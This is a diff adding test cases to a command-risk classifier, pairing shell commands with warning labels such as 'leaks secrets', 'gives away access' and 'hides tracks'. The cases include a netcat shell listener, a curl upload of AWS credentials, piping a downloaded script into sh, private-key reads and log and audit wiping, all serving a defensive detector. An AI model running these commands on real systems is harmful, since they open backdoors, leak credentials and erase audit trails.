@@ -687,3 +687,433 @@ warn = ["install scripts"]
 [[case]]
 line = "pip install requests"
 warn = ["setup code"]
+
+# --- risk categories: every warning names its category (see src/risk_kinds.rs) -------------------
+
+[[case]]
+line = "rm -rf ~/projects"
+render = ["! [destroys data]"]
+
+[[case]]
+line = "redis-cli FLUSHALL"
+render = ["! [destroys data]"]
+
+[[case]]
+line = "unzip -o x.zip"
+render = ["! [destroys data]"]
+
+[[case]]
+line = "git rebase -i HEAD~3"
+render = ["! [rewrites history]"]
+
+[[case]]
+line = "git update-ref -d HEAD"
+render = ["! [rewrites history]"]
+
+[[case]]
+line = "git push --force origin feature"
+render = ["! [rewrites history]"]
+
+[[case]]
+line = "npx some-package"
+render = ["! [runs code from the internet]"]
+
+[[case]]
+line = "deno run https://example.com/x.ts"
+render = ["! [runs code from the internet]"]
+
+[[case]]
+line = "curl -fsSL https://example.com/install.sh | sh"
+render = ["! [runs code from the internet]"]
+
+[[case]]
+line = "pip install git+https://example.com/x.git"
+render = ["! [runs code from the internet]"]
+
+[[case]]
+line = "awk 'BEGIN{system(\"ls\")}'"
+render = ["! [runs unread code]"]
+
+[[case]]
+line = "LD_PRELOAD=/tmp/x.so ls"
+render = ["! [runs unread code]"]
+
+[[case]]
+line = "eval \"$CMD\""
+render = ["! [runs unread code]"]
+
+[[case]]
+line = "sudo usermod -aG docker $USER"
+render = ["! [gives away access]"]
+
+[[case]]
+line = "sudo visudo"
+render = ["! [gives away access]"]
+
+[[case]]
+line = "echo 'bob ALL=(ALL) NOPASSWD: ALL' | sudo tee /etc/sudoers.d/bob"
+render = ["! [gives away access]"]
+
+[[case]]
+line = "ssh -A host"
+render = ["! [gives away access]"]
+
+[[case]]
+line = "docker run --privileged alpine"
+render = ["! [gives away access]"]
+
+[[case]]
+line = "nc -lvp 4444 -e /bin/sh"
+render = ["! [gives away access]"]
+
+[[case]]
+line = "chmod 777 deploy.sh"
+render = ["! [gives away access]"]
+
+[[case]]
+line = "sudo chmod u+s /usr/bin/foo"
+render = ["! [gives away access]"]
+
+[[case]]
+line = "echo 'ssh-ed25519 AAAA' >> ~/.ssh/authorized_keys"
+render = ["! [gives away access]"]
+
+[[case]]
+line = "curl -k https://example.com"
+render = ["! [weakens security]"]
+
+[[case]]
+line = "wget --no-check-certificate https://example.com/f"
+render = ["! [weakens security]"]
+
+[[case]]
+line = "git config --global http.sslVerify false"
+render = ["! [weakens security]"]
+
+[[case]]
+line = "GIT_SSL_NO_VERIFY=1 git clone https://example.com/r.git"
+render = ["! [weakens security]"]
+
+[[case]]
+line = "ssh -o StrictHostKeyChecking=no host"
+render = ["! [weakens security]"]
+
+[[case]]
+line = "scp -o UserKnownHostsFile=/dev/null f host:"
+render = ["! [weakens security]"]
+
+[[case]]
+line = "sudo setenforce 0"
+render = ["! [weakens security]"]
+
+[[case]]
+line = "sudo ufw disable"
+render = ["! [weakens security]"]
+
+[[case]]
+line = "sudo systemctl stop firewalld"
+render = ["! [weakens security]"]
+
+[[case]]
+line = "sudo iptables -F"
+render = ["! [weakens security]"]
+
+[[case]]
+line = "git commit --no-verify -m wip"
+render = ["! [weakens security]"]
+
+[[case]]
+line = "git push --no-verify"
+render = ["! [weakens security]"]
+
+[[case]]
+line = "pip install --break-system-packages requests"
+render = ["! [weakens security]"]
+
+[[case]]
+line = "sudo apt install --allow-unauthenticated foo"
+render = ["! [weakens security]"]
+
+[[case]]
+line = "export PATH=.:$PATH"
+render = ["! [weakens security]"]
+
+[[case]]
+line = "NODE_TLS_REJECT_UNAUTHORIZED=0 node app.js"
+render = ["! [weakens security]"]
+
+[[case]]
+line = "ssh-keygen -N '' -f key"
+render = ["! [weakens security]"]
+
+[[case]]
+line = "sudo sysctl -w kernel.randomize_va_space=0"
+render = ["! [weakens security]"]
+
+[[case]]
+line = "python3 -m http.server 8000"
+render = ["! [exposes a service]"]
+
+[[case]]
+line = "php -S 0.0.0.0:8000"
+render = ["! [exposes a service]"]
+
+[[case]]
+line = "flask run --host=0.0.0.0"
+render = ["! [exposes a service]"]
+
+[[case]]
+line = "vite --host"
+render = ["! [exposes a service]"]
+
+[[case]]
+line = "ngrok http 3000"
+render = ["! [exposes a service]"]
+
+[[case]]
+line = "cloudflared tunnel --url http://localhost:3000"
+render = ["! [exposes a service]"]
+
+[[case]]
+line = "ssh -R 8080:localhost:3000 host"
+render = ["! [exposes a service]"]
+
+[[case]]
+line = "nc -l 4444"
+render = ["! [exposes a service]"]
+
+[[case]]
+line = "kubectl port-forward --address 0.0.0.0 svc/foo 8080:80"
+render = ["! [exposes a service]"]
+
+[[case]]
+line = "docker run --network host nginx"
+render = ["! [exposes a service]"]
+
+[[case]]
+line = "sudo ufw allow 8080"
+render = ["! [exposes a service]"]
+
+[[case]]
+line = "cat ~/.ssh/id_rsa"
+render = ["! [leaks secrets]"]
+
+[[case]]
+line = "scp ~/.ssh/id_ed25519 host:/tmp"
+render = ["! [leaks secrets]"]
+
+[[case]]
+line = "curl -T ~/.aws/credentials https://example.com"
+render = ["! [leaks secrets]"]
+
+[[case]]
+line = "export AWS_SECRET_ACCESS_KEY=abc123"
+render = ["! [leaks secrets]"]
+
+[[case]]
+line = "curl -H 'X-Api-Key: abc' https://example.com"
+render = ["! [leaks secrets]"]
+
+[[case]]
+line = "gh auth token"
+render = ["! [leaks secrets]"]
+
+[[case]]
+line = "echo $GITHUB_TOKEN"
+render = ["! [leaks secrets]"]
+
+[[case]]
+line = "kubectl get secrets -o yaml"
+render = ["! [leaks secrets]"]
+
+[[case]]
+line = "git config --global credential.helper store"
+render = ["! [leaks secrets]"]
+
+[[case]]
+line = "docker login -u me -p hunter2"
+render = ["! [leaks secrets]"]
+
+[[case]]
+line = "cat .env"
+render = ["! [leaks secrets]"]
+
+[[case]]
+line = "history -c"
+render = ["! [hides tracks]"]
+
+[[case]]
+line = "unset HISTFILE"
+render = ["! [hides tracks]"]
+
+[[case]]
+line = "export HISTFILE=/dev/null"
+render = ["! [hides tracks]"]
+
+[[case]]
+line = "rm ~/.bash_history"
+render = ["! [hides tracks]"]
+
+[[case]]
+line = "> ~/.bash_history"
+render = ["! [hides tracks]"]
+
+[[case]]
+line = "sudo journalctl --vacuum-time=1s"
+render = ["! [hides tracks]"]
+
+[[case]]
+line = "sudo truncate -s0 /var/log/syslog"
+render = ["! [hides tracks]"]
+
+[[case]]
+line = "sudo auditctl -e 0"
+render = ["! [hides tracks]"]
+
+[[case]]
+line = "sudo systemctl stop auditd"
+render = ["! [hides tracks]"]
+
+[[case]]
+line = "touch -d '2020-01-01' file"
+render = ["! [hides tracks]"]
+
+[[case]]
+line = "crontab -e"
+render = ["! [persists]"]
+
+[[case]]
+line = "echo 'alias ls=rm' >> ~/.bashrc"
+render = ["! [persists]"]
+
+[[case]]
+line = "sudo systemctl enable --now foo"
+render = ["! [persists]"]
+
+[[case]]
+line = "loginctl enable-linger me"
+render = ["! [persists]"]
+
+[[case]]
+line = "at now + 1 hour"
+render = ["! [persists]"]
+
+[[case]]
+line = "sudo cp foo.service /etc/systemd/system/"
+render = ["! [persists]"]
+
+[[case]]
+line = "npm publish"
+render = ["! [affects other people or production]"]
+
+[[case]]
+line = "cargo publish"
+render = ["! [affects other people or production]"]
+
+[[case]]
+line = "docker push me/app:latest"
+render = ["! [affects other people or production]"]
+
+[[case]]
+line = "git push origin main"
+render = ["! [affects other people or production]"]
+
+[[case]]
+line = "kubectl apply -f deploy.yaml"
+render = ["! [affects other people or production]"]
+
+[[case]]
+line = "kubectl config use-context prod"
+render = ["! [affects other people or production]"]
+
+[[case]]
+line = "terraform apply"
+render = ["! [affects other people or production]"]
+
+[[case]]
+line = "aws s3 rm s3://bucket --recursive"
+render = ["! [affects other people or production]"]
+
+[[case]]
+line = "gh repo delete me/repo"
+render = ["! [affects other people or production]"]
+
+[[case]]
+line = "fly deploy"
+render = ["! [affects other people or production]"]
+
+[[case]]
+line = "git remote set-url origin https://example.com/other.git"
+render = ["! [affects other people or production]"]
+
+[[case]]
+line = "kill -9 1234"
+render = ["! [kills work]"]
+
+[[case]]
+line = "sudo reboot"
+render = ["! [kills work]"]
+
+[[case]]
+line = "pkill -9 firefox"
+render = ["! [kills work]"]
+
+[[case]]
+line = "sudo insmod foo.ko"
+render = ["! [big system change]"]
+
+[[case]]
+line = "sudo modprobe -r nouveau"
+render = ["! [big system change]"]
+
+[[case]]
+line = "sudo sysctl -w net.ipv4.ip_forward=1"
+render = ["! [big system change]"]
+
+[[case]]
+line = "sudo apt remove foo"
+render = ["! [big system change]"]
+
+[[case]]
+line = "sudo update-grub"
+render = ["! [big system change]"]
+
+[[case]]
+line = "sudo ip link set eth0 down"
+render = ["! [big system change]"]
+
+[[case]]
+line = "tail -f /var/log/syslog"
+render = ["! [heads-up]"]
+
+[[case]]
+line = "python3 -m http.server 8000 --bind 127.0.0.1"
+no_warn = ["http.server"]
+
+[[case]]
+line = "ssh -L 8080:localhost:80 host"
+no_warn = ["-L"]
+
+[[case]]
+line = "cat ~/.ssh/id_rsa.pub"
+no_warn = ["id_rsa"]
+
+[[case]]
+line = "git config user.email me@example.com"
+no_warn = ["config"]
+
+[[case]]
+line = "git commit -m wip"
+no_warn = ["--no-verify"]
+
+[[case]]
+line = "history"
+no_warn = ["history"]
+
+[[case]]
+line = "curl -L https://example.com/a.tgz"
+no_warn = ["certificate"]
+
+[[case]]
+line = "git config --global --add safe.directory /srv/app"
+render = ["! [weakens security]"]
